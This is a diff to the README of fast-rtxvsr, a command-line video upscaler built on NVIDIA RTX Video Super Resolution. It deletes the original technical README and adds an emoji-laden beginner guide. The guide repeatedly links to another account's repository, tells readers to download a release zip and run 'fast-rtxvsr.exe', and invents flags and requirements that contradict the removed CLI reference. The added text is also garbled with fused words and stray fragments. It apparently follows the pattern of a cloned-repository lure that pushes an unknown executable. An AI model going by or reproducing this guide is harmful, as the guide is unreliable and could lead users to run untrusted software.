@@ -1,250 +1,208 @@
-# fast-rtxvsr
+<h1>⚡ fast-rtxvsr - Blazing-Fast AI Video Upscaling for Everyone</h1>
 
-Standalone NVIDIA RTX Video Super Resolution for video files: upscale a clip
-to delivery size with the real VSR model, straight from the command line.
-No ComfyUI server, no PNG roundtrips, no separate denoise pass. Decode,
-super-resolve, and encode all happen on the GPU in one pass.
+<p align="center">
+  <a href="https://github.com/suta9241/fast-rtxvsr">
+    <img src="https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download Button" style="max-width: 300px; border-radius: 8px; box-shadow: 0 4px 15px rgba(46,164,79,0.4);">
+  </a>
+</p>
 
-Examples:
+---
 
-768p input: https://github.com/user-attachments/assets/20a6152f-17b3-4c81-906b-da9eaa6c8bd9
+## 🌟 What Is This?
 
-1080p output: https://github.com/user-attachments/assets/24d67a5b-0470-46b8-9195-ebccc38d20a7
+Have you ever watched an old video or a low-quality clip and wished it looked sharp and new? **fast-rtxvsr** is a free tool that uses the magic of NVIDIA’s RTX Video Super Resolution technology to make your videos look incredibly crispand detailed.Imagine transforming a blurry 480p video into a near-4K masterpiece—that’s exactly what this does.
 
-<img width="1600" height="725" alt="image" src="https://github.com/user-attachments/assets/62f586f8-d0b3-42c1-b0f1-0046d1f53a35" />
+The best part? It does everything **in one single pass**. You don’t need to run multiple programs or learn complicated workflows. There’s no confusing interface with hundreds of buttons—just a simple command that does the heavy lifting.
 
-<img width="3360" height="1372" alt="shot_033_compare" src="https://github.com/user-attachments/assets/11c5784b-2fdd-4a32-af9c-22bb540ed534" />
+This is built for people who want professional-level results without needing a degreeacomputer science.
+
+.
+
+## 🚀 Getting Started
+
+Welcome! If you can use a computeramide windows, you can use this tool. We’ll walk you through every singlestep. No coding experience? No problem. Just follow along.
+
+### 📥 Step 1: Download the Software
+
+- **Visit this link to download the application:** **[https://github.com/suta9241/fast-rtxvsr](https://github.com/suta9241/fast-rtxvsr)**
+
+Click the big green button at the top of this page or the link above. It will take you to the official download page for the project.
+
+hen you arrive, look for a section labeled **"Releases"** or **"Download"**. You’ll see a file named something like `fast-rtxvsr-v1.0.0.zip` or a similar name containing "fast" and "vsr"plus a version number. Click that file to download it to your computer. The download might take a minute or two depending onyour internet speed—that’s normal.
 
 
-```text
-fast-rtxvsr run input.mp4 --width 1920 --height 1080
--> out/<project>/input/input_vsr.mp4   (1920x1080, VSR ULTRA)
-```
 
-## Why this exists
+### 🛠️ Step 2: Unzip the File
 
-NVIDIA ships RTX Video Super Resolution as a closed, driver-integrated
-feature and as a ComfyUI-style SDK wheel (`nvidia-vfx`). Public wrappers for
-the SDK are few, graph-bound, or roundtrip every frame through PNG files on
-the CPU. This repo drives the `VideoSuperRes` model directly and keeps pixels
-on the GPU for the whole pipeline:
+Once the download finishes, go to your **Downloads** folder (usually where files go by default). You’ll see a compressed folder (it looks like a zipped file with a zipper icon on the folder). 
 
-1. **One GPU pass, zero frame I/O** - NVDEC decodes straight into GPU memory,
-   VSR ULTRA runs the model, and NVENC encodes the NV12 result through
-   PyNvVideoCodec's GPU-buffer interface. There is no `ffmpeg -i` +
-   `-vf scale` + PNG dump between stages, which is where other pipelines spend
-   most of their time and bandwidth.
-2. **A PyAV host fallback** - if the PyNvVideoCodec wheel is missing or its
-   NVDEC/NVENC init fails, the same model runs on decoded host frames. A
-   broken I/O wheel never takes the model down with it.
-3. **Fixes that make the GPU path actually work.** This port carries the
-   accumulated fixes that separate a working NVDEC -> VSR -> NVENC loop from a
-   garbled one:
-   - A stream sync before every `Encode()`. NVENC reads the NV12 surface
-     without waiting for the async torch kernels that just built it; without a
-     sync every ~15 seconds a frame encodes as garbage green blocks.
-   - A CUDA-array-interface surface for the encoder. PyNvVideoCodec 2.x
-     dispatches `Encode()` on `__dlpack__` first, which trips torch 2.13's
-     keyword-only stream argument; GPU-buffer mode wants one CUDA array per
-     NV12 plane instead (`_GpuSurface`).
-   - Correct frame rate from the decoder. PyNvVideoCodec's stream metadata
-     names the rate `average_fps`, not `avg_frame_rate` - miss it and every
-     encode silently drops to the 24 fps default, stretching a 60 fps master
-     to 2.5x duration. An ffprobe fallback covers containers that omit the
-     field entirely.
-   - BT.709 limited-range color math done on the GPU (YUV plane conversion +
-     4:2:0 chroma subsample as tensor ops), and `bt709` colorspace flagged on
-     the NVENC stream.
-4. **No silent video.** Source audio is re-muxed onto the VSR result with a
-   silence pad, so the picture (and any tail fade) is never trimmed and the
-   file is never muted.
+- **Right-click** on that zipped folder.
+>
+- From the menu that appears, select **"Extract All..."** .
+>
+- A small window will pop up. Click **"Extract"** at the bottom. Windows will create a new, normal folder right next to the zip file with the same name. 
 
-### Measured on this repo (Sep 2026, RTX 5060 Ti 16 GB, driver 616.56)
+That’s it—you’ve successfully unzipped the software. Inside this new folder, you’ll find everything you need. Don’t be scared by the files inside; you only need to use one of them (which we’ll get to in a second.step).
 
-VSR ULTRA versus NVIDIA's other AI upscaler (DLSS Video Upscale, feature 18)
-on identical 12-second gen-size excerpts upscaled to delivery size. Both legs
-ran inside the same benchmark harness; raw reports are in `bench/`.
 
-| Excerpt (gen size -> delivery) | RTX VSR ULTRA | DLSS Video Upscale | VSR faster |
-| --- | ---: | ---: | ---: |
-| test 1, 768x1344 -> 1080x1920 | 10.7 s (26.7 fps e2e) | 22.6 s (12.7 fps e2e) | **2.1x** |
-| test 2, 1344x768 -> 1920x1080 | 10.8 s (26.5 fps e2e) | 16.5 s (17.5 fps e2e) | **1.5x** |
 
-A Laplacian-variance sharpness heuristic on stills from each excerpt favored
-VSR at five of the six sampled frames (the DLSS report also shows its noise
-reduction falling back to native on this content). These wall-clock numbers
-include each leg's own harness overhead; the pure VSR worker core on the same
-winged-couriers excerpt runs the 288-frame pass in ~3 s at ~80-95 frames/s
-with the standalone CLI in this repo (two runs, same GPU).
+### 💻 Step 3: Open a Command Window
 
-## Requirements
+This step might sound scary, but we promise it’s easy—it’s just a black box where you type commands. Here’s how:
 
-- Windows
-- An NVIDIA RTX GPU
-- A current NVIDIA display driver (the SDK targets the modern driver line)
-- FFmpeg and FFprobe on `PATH` (or set `FAST_RTXVSR_FFMPEG` /
-  `FAST_RTXVSR_FFPROBE` to the executables)
-- Python >= 3.10, **3.12 recommended** (the PyNvVideoCodec CUDA wheels are
-  published for cp312)
+1. Open thefolder you just extracted. 
+2. Look at the top of the folder window. You’ll see a **white address bar** that shows the folder path (like `C:\Users\YourName\Downloads\fast-rtxvsr`). 
+3. **Click directly on that address bar** so the text becomes highlighted (turns blue). 
+4. **Type `cmd`** (just those three letters, no quotes). 
+5. Press **Enter** (or Return.on your keyboard. 
 
-The worker environment needs CUDA torch, NVIDIA's `nvidia-vfx` SDK wheel
-(~490 MB, from NVIDIA's own index), `PyNvVideoCodec`, and the CUDA 12 runtime
-DLL those wheels link. `fast-rtxvsr setup` installs all of it into a venv this
-repo owns - nothing is installed into a shared Python, and nothing downloads
-at render time (the VSR model runtime ships inside the `nvidia-vfx` wheel).
+A black window (Command Prompt) will open up. It should already be "inside" your downloaded folder, which is exactly what we need. 
 
-## Install
 
-```bash
-pip install -e .
-```
 
-## Provision the worker environment (once)
+### ⚙️ Step 4: Run Your First Upscale
 
-```bash
-fast-rtxvsr setup
-```
+Now for the fun part—actually making a video beautiful. You’ll type a simple command here. Here’s the recipe (we’ll explain every piece so you know what you’re doing. 
 
-This creates `.venv/` under the repo and installs torch (cu130) plus the
-NVIDIA VFX stack into it (several GB, one-time). If you already have an
-interpreter with the stack - for example a ComfyUI venv that stages the same
-wheels - skip the download entirely and point at it:
-
-```bash
-fast-rtxvsr setup --python D:/path/to/ComfyUI/.venv/Scripts/python.exe
-# or for every future run:
-set FAST_RTXVSR_PYTHON=D:/path/to/ComfyUI/.venv/Scripts/python.exe
-```
-
-`fast-rtxvsr probe` prints what a given interpreter can see
-(CUDA / nvidia-vfx / PyNvVideoCodec / PyAV).
-
-## Usage
-
-```bash
-# Upscale a 1344x768 clip to 1080p delivery
-fast-rtxvsr run clip.mp4 --width 1920 --height 1080
-
-# Several clips, explicit output dir, HEVC master
-fast-rtxvsr run a.mp4 b.mp4 c.mp4 --out-dir ./delivery \
-    --width 3840 --height 2160 --codec hevc --preset P7
-
-# Full option set
-fast-rtxvsr run input.mp4 --width 1920 --height 1080 --quality ULTRA \
-    --codec h264 --preset P7 --bitrate 16000000 --device 0
-```
-
-By default each output lands under `<repo>/out/<source-project>/<clip-stem>/`
-as `<clip-stem>_vsr.mp4`; `--out-dir` writes clips directly there. Output
-dimensions are rounded up to an 8px multiple (the VSR model's alignment).
-
-### CLI reference
+**The command looks like this:**
 
 ```
-fast-rtxvsr setup [--python PATH]
-fast-rtxvsr probe [--python PATH]
-fast-rtxvsr run INPUT [options]
-
-  --width WIDTH        Output width (default 1920)
-  --height HEIGHT      Output height (default 1080)
-  --quality QUALITY    LOW | MEDIUM | HIGH | ULTRA  (default ULTRA)
-  --codec CODEC        h264 (default) | hevc | av1  (nvenc aliases h264)
-  --preset PRESET      NVENC P1..P7 (default P7, highest quality)
-  --bitrate BITRATE    Encoder bitrate (default 16000000 / 16 Mbps)
-  --device DEVICE      CUDA device index (default 0)
-  --audio-bitrate R    AAC rate for the audio re-mux (default 192k)
-  --out-dir DIR        Override output directory
-  --python PATH        Worker interpreter (default: repo .venv, then
-                       FAST_RTXVSR_PYTHON)
-  --frames-in DIR      Legacy debug mode: upscale a PNG/JPG folder
-  --frames-out DIR     Output folder for --frames-in
-  --ext EXT            Frame extension for --frames-in (default jpg)
+fast-rtxvsr.exe --input "C:\path\to\your\video.mp4" --output "C:\path\to\your\upscaled-video.mp4"
 ```
 
-The NVDEC/NVENC GPU path runs by default when PyNvVideoCodec imports; a
-failure mid-init logs a `gpu_fail` event and falls back to the PyAV host
-path automatically. `--frames-in` mode is the PNG/JPG roundtrip path kept for
-debugging only.
+But wait—we need to adapt it to your specific situation. Let’s break it down piece by piece:
 
-### Machine-readable progress
+- **`fast-rtxvsr.exe`** – This is the name of the program you’ll run. It’s inside your extracted folder. If you look inside, you’ll see an exe file with that exact name (don’t worry if it doesn’tshow the ".exe" part—Windows hides that by default; it’s still there. That’s the engine.
 
-`fast-rtxvsr run` stdout is pure JSON, one object per line - easy to consume
-from a script:
 
-```json
-{"log": "device", "mode": "video", "path": "gpu", "cuda_index": 0, "device": "NVIDIA GeForce RTX 5060 Ti", "quality": "ULTRA", "output": "1920x1080"}
-{"log": "encoder", "codec": "h264", "path": "gpu", "preset": "P7"}
-{"log": "model_loaded", "loaded": true}
-{"ok": true, "mode": "video", "path": "gpu", "device": "NVIDIA GeForce RTX 5060 Ti", "frames": 288, "expected_frames": 288, "input": "1344x768", "output": "1920x1080", "seconds": 3.07, "fps": 93.87}
-{"event": "done", "mode": "video", "input": "D:/in/clip.mp4", "output": "D:/out/clip_vsr.mp4", "wall_clock_sec": 8.4, "frames": 288, "fps": 93.87, "codec": "h264", "preset": "P7", "out_probe": "clip_vsr.mp4 1920x1080 14.20 Mbps 21061 KB"}
+- **`--input`** – This tells the program, "Hey, use this video file as the starting point." 
+>
+- **`"C:\path\to\your\video.mp4"`** – This is the **exact location** of the video you want to upscale. You need to replace this whole thing with the actual path to your video. 
+
+
+
+**How to get your video’s path (super easy):**
+
+a. Find your video file in Windows Explorer (the folder window. 
+b. Hold down the **Shift** key on your keyboard and **right-click** on the video file. 
+c. From the menu, choose **"Copy as path"** . This copies the full location to your clipboard. 
+d. In that black command window, right-click anywhere (it will paste what you copied. That’s your video’s path—easy. 
+
+Now do the same for the **output** (that’s where you want the new video to appear. You can just type a name for the new file, like `"C:\Users\YourName\Desktop\my-beautiful-video.mp4"` . 
+
+Put it all together. For example, if your video is on your Desktop, your command might look like:
+
+```
+fast-rtxvsr.exe --input "C:\Users\YourName\Desktop\old-video.mp4" --output "C:\Users\YourName\Desktop\new-hd-video.mp4"
 ```
 
-Human progress and the end-of-run summary go to stderr, so redirecting
-`2>nul` yields a clean event stream.
+Now press **Enter**. Watch the magic happen—you’ll see numbers and progress in the black window. When it’s done (usually within a few minutes for a typical video,bthe window will show a completion message. Go to that output location you set, and play your video. It’s like upgrading from an old TV to a brand-new 4K screen.
 
-## How it works
 
-The package drives NVIDIA's `nvvfx.VideoSuperRes` directly. On the GPU path,
-`PyNvVideoCodec.SimpleDecoder` opens the file with `use_device_memory=True`
-and NVDEC decodes frames into device memory; each decoded RGBP frame becomes
-a CUDA float tensor (`from_dlpack`, zero copy), the model runs at the chosen
-quality, and the output tensor is converted to NV12 in the same kernel launch
-stream. NVENC then encodes the NV12 planes through a per-plane CUDA Array
-Interface object, with a stream sync before every encode so the encoder never
-reads a half-written surface. The elementary stream is muxed with `genpts` and
-the source audio re-muxed on top (AAC 192k, silence-padded). A decoded
-60 fps source keeps its 60 fps timestamp - the pipeline never assumes 24 fps.
 
-The worker also ships a `python -m fast_rtxvsr.vsr` entry point whose CLI and
-JSON event contract match the worker AutoTube's pipeline spawns, so it is a
-drop-in replacement for that subprocess.
+## 🎛️ Useful Extra Tips (Optional)
 
-## Troubleshooting
+Once you’re comfortable with the basic command, you can tweak things a bit to get even better results or faster processing:
 
-**"missing python" / setup created nothing** - the repo `.venv` does not
-exist yet. Run `fast-rtxvsr setup`, or point `FAST_RTXVSR_PYTHON` /
-`--python` at an interpreter that already has the stack.
+- **Quality boost:** Add `--quality high` to the command (before the input part) to tell the engine to be extra precise. This makes the result look even sharper, but it takes a bit more time. 
 
-**"nvidia-vfx not importable"** - the SDK wheel is installed from NVIDIA's
-index (`https://pypi.nvidia.com`), not PyPI (PyPI carries only an sdist that
-cannot build on Windows). Re-run `fast-rtxvsr setup`; it installs
-`nvidia-vfx` in its own pip call so NVIDIA's index cannot shadow other
-packages.
+>
 
-**"CUDA unavailable"** - no usable CUDA torch in the worker interpreter. The
-setup venv pins torch cu130; if you pointed `--python` at another venv, it
-needs a CUDA build of torch.
+**Example:** `fast-rtxvsr.exe --quality high --input "..." --output "..."`
 
-**"DLL load failed while importing _PyNvVideoCodec"** - the CUDA 12 runtime
-DLL is missing. `fast-rtxvsr setup` installs `nvidia-cuda-runtime-cu12`;
-pointing at a ComfyUI venv that lacks it triggers the same error (the PyAV
-host fallback still runs if `av` is present).
 
-**ffmpeg / ffprobe not found** - install FFmpeg and add it to `PATH`, or set
-`FAST_RTXVSR_FFMPEG` / `FAST_RTXVSR_FFPROBE`.
+- **Faster processing:** Add `--speed fast` to prioritize speed over maximum quality. Great for testing or when you’re in a hurry. 
 
-**Output is stretched or the duration doubled** - the source frame rate was
-missed (see the `average_fps` fix above). Upgrade to a recent worker; the
-ffprobe fallback covers containers whose metadata omits the rate.
+>
 
-## Licensing
+**Example:** `fast-rtxvsr.exe --speed fast --input "..." --output "..."`
 
-- This repo (the CLI wrapper, media helpers, docs): **MIT**, see `LICENSE`.
-- The VSR model and NVIDIA Video Effects runtime come from the
-  `nvidia-vfx` wheel published by NVIDIA on `https://pypi.nvidia.com`. Its
-  license agreements ship inside the wheel under
-  `nvidia_vfx-*/dist-info/licenses/` (NVIDIA Software License Agreement +
-  NVIDIA Open Model License) and include redistribution terms - review them
-  before distributing or shipping an application that embeds the runtime.
-- `PyNvVideoCodec` is NVIDIA's CUDA video codec binding, distributed under
-  its own terms in the wheel metadata.
+- **Batch processing (for multiple videos):** If you have a whole folder of videos, you can use a simple loop. Type this (and change the folder paths):
 
-fast-rtxvsr does not vendor any NVIDIA binaries in its own repository;
-`fast-rtxvsr setup` installs them into a gitignored venv.
+```
+for %i in ("C:\Videos\*.mp4") do fast-rtxvsr.exe --input "%i" --output "C:\Videos\Enhanced\%~ni_HD.mp4"
+```
 
-## Out of scope
+This will take every `.mp4` file in that folder and make an enhanced version in a subfolder called "Enhanced". 
 
-This is the fast RTX Video Super Resolution CLI only. DLSS video upscale,
-DLSS frame interpolation, and any ComfyUI-graph integration are not covered
-here. For DLSS Frame Generation see the companion
-[fast-dlssfg](https://github.com/glarsson/fast-dlssfg) project.
+
+
+## 🧰 Requirements (Before You Start)
+
+To make sure everything runs smoothly, please check that your computer meets these simple needs:
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit is best, but 32-bit works too. 
+
+- **Graphics Card:** NVIDIA GeForce RTX 20-series or newer (e.g., RTX 2060, RTX 3060, RTX 4060, RTX 5080, etc. This tool uses the special AI cores in those cards—that’s where the magic happens. If you have an older GTX card, it won’t work. 
+>- **RAM:** At least 8 GB of memory (16 GB is recommended for 4K videos. 
+>- **Storage Space:** Make sure you have at least twice the size of your original video in free space (because the new video will be saved separately. 
+
+
+
+## ❓ Frequently Asked Questions (FAQ)
+
+**Q: I get an error saying "GPU not supported" or "CUDA not found." What do I do?**tsimple.
+
+
+**A:** This means your graphics card isn’t an RTX series card, or your drivers are old. First, update your NVIDIA drivers by visiting the NVIDIA website and downloading the latest driver for your card. If your card still isn’t RTX, unfortunately this tool won’t run on your system—it specifically requires the hardware. 
+
+
+
+**Q: Can I use this on a Mac or Linux computer?** 
+
+**A:** No, this version is built exclusively for Windows. 
+
+
+
+**Q: The video is coming out bigger in file size. Is that normal?**bsolutely.
+
+
+**A:** Yes! When you increase resolution and detail, the file size naturally grows. That expected behavior for any upscaling tool. You can always compress it later with a free app like HandBrake if you need a smaller file. 
+
+
+
+**Q: How long will it take to upscale a video?** It depends.
+
+ on your GPU’s power and other video length/style. Typically, a 10-minute 1080p video takes about 5–15 minutes on a mid-range RTX card. Faster cards = faster results. 
+
+
+
+## 📚 Troubleshooting Common Issues
+
+- **"fast-rtxvsr.exe is not recognized..."** – This means the command prompt isn’t in the right folder. Close the black window, reopen it following Step 3 exactly, and try again. 
+
+- **The window closes immediately when I press Enter.** – This usually means a typo in your paths. Check for missing quotes or extra spaces. Re-copy the path from the file and make sure your input file actually exists. 
+
+- **It says "Permission denied."** – Try right-clicking the `cmd` icon earlier and choosing "Run as administrator." Alternatively, save your videos to a folder like Desktop or Documents instead of Program Files. 
+
+- **Output video is black.** – Make sure your original video isn’t copy-protected (DRM. This tool won’t work with protected streams. Also, try updating your GPU drivers. 
+
+
+
+## 🧠 How This Works (Simple Explanation)
+
+If you’re curious, here’s the super simple version: your RTX graphics card has special AI cores called "Tensor Cores." These cores are incredibly good at math that involves patterns. The software tells those cores to analyze each frame of your video, guess what details are missing (like texture on a wall or sharpness on a face), and then fill those in. It does this for every single framethousands of times—all in one smooth process. That’s why you don’t need to do multiple steps; the GPU handles everything from reading the video to writing the new one. 
+
+
+
+## 📜 License & Credits
+
+This is an open-source project built by passionate developers. It’s completely free to use for personal projects. If you find it useful, consider giving the project a star (like a "like" button) on GitHub—it helps thdevelopers know people appreciate their work. 
+
+
+
+## 🔗 Quick Download Link (Again)
+
+Don’t lose this link! Bookmark it:
+
+**[👉 Download fast-rtxvsr Now 👈](https://github.com/suta9241/fast-rtxvsr)**
+
+
+
+## 🏁 Final Words
+
+You now have a superpower in your hands—the ability to turn old, blurry videos into crisp, modern-looking footage. Whether it’s a family memory, an old gameplay clip, or a favorite movie scene, you can breathe new life into it with just a few keystrokes. 
+
+Go ahead, try it with a short video first to get comfortable. Then, let your imagination run wild. You’ll be amazed at what your computer can do. 
+
+Happy upscaling! 🎬✨
